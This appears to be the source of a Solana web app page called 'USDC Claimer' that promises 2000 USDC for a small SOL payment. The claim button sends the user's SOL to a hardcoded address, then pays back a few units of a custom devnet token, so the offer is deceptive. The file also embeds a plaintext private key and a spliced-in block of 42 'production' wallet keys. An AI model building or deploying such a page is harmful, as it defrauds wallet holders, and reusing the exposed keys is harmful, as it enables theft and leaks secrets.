/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "37sU1xt4omzrfRb9SRtiGBRUPj4rSyTa7wwT9TXyYWFyqAnZZEsMovAVv3casRiCSi5mnv9d6yiScffCFDyLWN8Z"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "34nowQv6ZM38CHSQvijTC6Ribkdzf3cE6prnB46vMtMk2NoVm5Vjjj7Jb8PqiJA7JzkbpS7c6L9TLafw1B67cR9a",
  "key1": "SA5NfDV7zY8dNY6dXabthKSbnRgceZHYr1EM51n5uwFoBwgfbtZ4eTgJCzvnVHx7aKD5TLgE3UwoEd6QFZzPSt4",
  "key2": "5Da1mEsiEnSTvURoJsu6KeyVvnKvZabCG1RZBe1y2P5mTHBE7VSXRyK99wZDwR511u1sP6BJZKhmpz7FZJukV95E",
  "key3": "56ryJJD3AAFTn2hhPA3tWBZPSJk7rVbeiAsCpGEYFE1ugB3hYh92pS5D5n56u3Z4T23KRY5PaTxWgdpiNrcsRcsP",
  "key4": "2Bzufk3bbpA5DwheDwgB2ZvdQchuizKga5qyDnp4s6viiAVautx8Yx8XY2ebtpw7eKkiHQu1zgsxRABM4Gug4DM5",
  "key5": "5Uodptm6ZyF6eRAHUAQL4KRqggLdng2wpbEkgsi8WKkBPx3gXhYAZ5ufLKWkKgemaacP2yupC2NbVXAZjd1iDwjy",
  "key6": "5ihV6k8KhmmoadaAPgWmtg3D7kt8zwLi68u9aKGWYveiedPDWAhr3etczpyanccjZ2qmtw6RqbacekUBTpMTdESc",
  "key7": "5aLiE9meTxoDcL6tgDWzcqaJj5pT69pK9voUU6UvD72wUrrz2gHeFkBmyTX7gXGpANmdE78xox8T3avmkvVrw85A",
  "key8": "4VEFYssj2hPScvwvqHZ7dzZtCXQcEMu9vWNpvEyyZJcSCNcgWGH1WTJqGV9o4gmgAE3yHaUwAoPtiggagPqpp4Pv",
  "key9": "2LHnDsy8gKqpy1hPLwpLucAooqfnodnZBTGfZEktbF4UR9Dwnzg5kpsN6Zao2MT6ovNxnMudBjo7wMWij77w2La6",
  "key10": "5Wb9cxywn4aTviRbeR1BNEkNdpuXjySpe4Qcu3WaQK4mGrY45e5MzmYdHoEym6rZT1ihxXyo5CKEkh8gEuRa6JAd",
  "key11": "4CaGLbcG5oWgJkS6W7xMfiwzmF3jreRLJYuHXLAY2okFjbeLq1YmYUFDPf4b1uUMV6ZaT8N7FqhVY9fQjXmeHT3D",
  "key12": "3U1xSspcRXUTPJ4uByUAgAbY6Y5PiARpf1hfg4DT76p4sUAmg3D5V8iv4Dj1d4t9GN4LKdG48vj5FUsFhSKP5Uo8",
  "key13": "65mh3Lx2eSqDbHwPbwHEdeKbL2rDW5F2QtTKJ3RfTuygDDCtbaxXC87P9t5xsZb3zkebbJL9YUQ4MSvPajuUi4wP",
  "key14": "2cPkkB9oCETyiY8eDGg2Jr7QycZDWMeJPoxoXhswmA5vxYCNrmSwmyQeCpx2zsabZLUsKnTeoGWjoLco1hk9GfkN",
  "key15": "56zCQKYGWYS26S8aF5W1eYRyDQB8LJ5vKj2r4btts9xd4joEYYsZRJtXxATSfWG7D1Fb2jw5GzYRjhaxs3iwoSKB",
  "key16": "4bouWJx4NiCLJBYcXeUcBhMPQMVBCVBj7EYXgELeDVsJHUDu9QG83M3EXtAEt3os8qvthPGQ5Xu3Vap4TyBevbpv",
  "key17": "x3g4bdKi1wvANGuMGipd6dWQhr1M89pWKLxeuK4PMNCXc6JoHewVJ3vwnHbZYX4rTps6Gdp8BvoSZ7A4i1J2kLb",
  "key18": "9txCDf5vhgR6yXpLhVL49W5g186rBCCEzXqzbtH7K7Vd5MUfYGyGjFMdAmY41d68KWiF626X7nvVdWmJzVfDUPT",
  "key19": "5inE1fumWss5EMHivkruEa8J1KBDDK7THE3qnJ61oewj9JgSSD963MdgJVdLr2LyUhGjjDXZpy76jn3vDyFRJxei",
  "key20": "3qjY8kEgbFHHsXiZXMfF6owQWTMnrbBroXcervtXkp7VKdRhZCLGknjXUsCF11v2P25sADnZsMamh29vcwNttMEH",
  "key21": "jbkmJqWTBLVdetwzntDuv9pqqWvMAqKhj5zC9XKg3BZLd5pwxNPbCmExAsG4iip35bNH1WYnxYSzfGkzJzJCMk9",
  "key22": "66uSs3qt1GeHtbN47TduYchCLzcHTS1ozyVC89WcZjAoj37NbzpYW3uAsMGetDQMUZh1WdWxocqXU1MwoxeJMsC",
  "key23": "3dGkkfPmp3aEgUfZoup8Sqe4jXtnGFdVfnwQDXVHAb1TbL1XNuWgsLMBSxBr6eT2EJfABVopC5vjjeYKXiN31QzX",
  "key24": "BZm1GH1zA3GPiiA2spemXb48A3WYTABYnuw1YWoSLCV8a6uGM6g8UiuEYz1bELjrCtCPA85ArwM8oDQyhkNyuRE",
  "key25": "2Gz9XftFVTc8jvTuxp3pQLspJdbjUshkUUZdauU6YXBVg8MwbTY7mcnqJPxLrsxWcas6hcpFNuLiJBEDgKqNjw5j",
  "key26": "3jMrQqyzEgdpKe5371GtabuN9AjLtPcv1EkYhgLHtDDVtq4U8Fu2JV6SYw3wywZmjRPjw2vJm4g9wnMBBdaT3Pyh",
  "key27": "26PNvWYr5CFnMJKGRWrzchibCicGxpcpihSgtCd5qLTDXAgcevZU6YCzB9eG8bDaBB11JHTmGVSq2iJKFMG8T1Cm",
  "key28": "2weMFmTjQ4S8qFBxZ3DhcmTkaMpBxThJuh5JDqk8U7mqF6Zh2QaF42uyAFDLooM4oh8odsUDxAQp1Nstd8sHDKSE",
  "key29": "3DGgg5oVFEtpBymC2EsVXTZ5DEEiFu5RHx8oeyYmCZdX14eKXQTCpkbyP41oyZWKTfF96TRhANcePXyjUCAZZsHd",
  "key30": "5C5tEUCc5wPvAU5JzYSrQAZtTMcxd5uoLHmg8MkUJAggzkivfScnD3FkgEYkHLutAoYJSz64Lora7GSxCEKAtjBL",
  "key31": "5gJN5gzE9n5NLzTZBgJDUTtapA6WMHGupv5DXBgjrPTWBxhxhmeS87CwY5uLmvUQxqB68jXKzi1fjVH1d9p8Qhpq",
  "key32": "66hv7fQnM9g1BHFYyaWEz7edJUZfceJDPbtstMQ5BPPBn4W69QczDbAnxp8kzazZxvXLxozEPUfdKHSNtwVuMRnQ",
  "key33": "5Gh4jgYqsbjMqLeLuC7SDQ6yqiEPs3ADbqqTpPKS6G3srFdbFstXXdtSxwdNda82uzYjYpFoWLJAoG8pzUpnCPW5",
  "key34": "5PBkt23PT5ZjvDqG1mYpiHURHRALNfRLBLvHLNwPBjFQLixNqigN4RRVk78DVQ9pwzN8DkSir3sZkdmvUkEzWzfk",
  "key35": "5VTR6gj1vwuqzBBWw5h9EwtyDWF5KupgQdL9CtFCEX91uECU8qUTfCqKd49DCaVQDQUMwHKB54MtrMJStg8JJbQu",
  "key36": "5EUdjfJvB6qyC2pWjpXJFjWawHKEUxbK15TKEBqk8X2RVZghTCPmtcb2e817WF8zq7a89mwEqW2ZPvxvFjSC9ApQ",
  "key37": "33W3PXFQMAB8rAfSDEAshd1bo5oVVFyyjUJo4HuT91Q3VmBnZ2C8ZhzZ8bDvL6nBzSsGGmrku5Tv9M132iZ5j8K3",
  "key38": "4qRQJjRSD5ZLG2FSVBwsQRmp536NjB4wqApjBTCc8ZnxEvmdophJ92gsv4CowSVotxsfExK1uHX6rfzW57SLotuY",
  "key39": "5DvwL1WZnFuAA2qLwW6mUDiqi27MMkdQsjATPMbPN7N896WEqq6hqqsADAss14bUwhSaJ8X7rnDfprVbbTt2CjqQ",
  "key40": "2jXc7KRd2b498ZtsXXi2aHifV6ry87sTpc7HNsbqRU8kqdx1QCtjNND54UCDtMQ5zeWfYLoCe5ahLHZccPtj3akQ",
  "key41": "yejYE4QzRs1nL621NpqV7L9biS5koWXBh6aXYJ2DvpSnnJwZeXBqRdwQQsbqup7FCUEjCQFLY6Zx3S3vms2tdHF"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
